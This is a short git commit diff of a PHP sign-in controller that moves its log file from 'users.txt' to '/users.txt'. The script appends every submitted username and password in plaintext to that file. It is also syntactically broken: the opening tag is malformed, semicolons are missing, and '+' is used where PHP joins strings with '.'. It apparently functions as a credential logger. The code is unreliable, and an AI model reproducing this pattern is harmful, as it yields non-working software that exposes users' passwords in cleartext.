e90bc6e29922153ab28eb8c90f37d214a80920e9
vanillangel <72797966+vanillangel@users.noreply.github.com>
2020-10-14 15:19:28 +0400

    Update sign_in.php

--- controllers/sign_in.php
+++ controllers/sign_in.php
@@ -1,7 +1,7 @@
 <? php
 $si_un=$_POST['si_username']
 $si_pasw=$_POST['si_password']
-$filename = 'users.txt';
+$filename = '/users.txt';
 file_put_contents($filename, "Пользователь: "+$si_un+"Пароль: "+$si_pasw,FILE_APPEND);
 
 ?>
